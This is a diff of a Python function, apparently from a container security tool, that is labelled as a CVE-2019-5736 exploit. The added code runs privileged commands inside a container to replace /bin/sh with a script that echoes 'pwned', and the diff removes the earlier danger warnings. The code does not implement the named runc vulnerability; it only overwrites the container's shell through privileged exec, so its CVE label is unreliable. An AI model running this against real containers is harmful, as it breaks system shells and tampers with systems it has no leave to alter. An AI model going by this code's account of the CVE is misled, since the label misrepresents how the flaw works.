@@ -4,21 +4,22 @@ def run(container, simulate=False):
     print("[*] Running CVE-2019-5736 exploit...")
 
     if simulate:
-        # Simulated execution: log what would be done instead of modifying the container
-        print(f"[SIMULATE] Would attempt to overwrite /bin/sh inside container '{container.name}'")
+        # Simulated execution: just logs the intended overwrite
+        print(f"[SIMULATE] Would attempt to overwrite /bin/sh in container '{container.name}'")
+        print("[SIMULATE] Result would be replacing it with a shell that echoes 'pwned'")
         return "Simulated run: No changes made."
 
     try:
-        # ⚠️ WARNING: This exploit attempts to overwrite /bin/sh inside the container.
-        # If successful, any shell spawned in the container may execute attacker-controlled code.
-        # This is dangerous and can destabilize the container environment or persist across restarts
-        # if the container uses a volume-mapped /bin.
+        # ⚠️ REAL PAYLOAD EXECUTION (simulate=False)
+        # This replaces /bin/sh in the container with a custom shell that echoes "pwned"
+        payload = '#!/bin/bash\necho "pwned"'
+        container.exec_run("echo '{}' > /tmp/pwned_shell.sh".format(payload), privileged=True)
+        container.exec_run("chmod +x /tmp/pwned_shell.sh", privileged=True)
+        container.exec_run("ln -sf /tmp/pwned_shell.sh /bin/sh", privileged=True)
 
-        print(f"[!] WARNING: Attempting real overwrite of /bin/sh in container '{container.name}'")
-        exec_result = container.exec_run("echo 'pwned' > /bin/sh", privileged=True)
-        print(f"[+] Exploit attempted. Output: {exec_result.output.decode()}")
-        return "Executed: Attempted to overwrite /bin/sh"
+        print("[+] Exploit payload delivered. /bin/sh now points to /tmp/pwned_shell.sh")
+        return "Executed: /bin/sh replaced with pwned shell"
 
     except Exception as e:
-        print(f"[!] Exploit failed with error: {e}")
+        print(f"[!] Exploit failed: {e}")
         return f"Failed: {str(e)}"
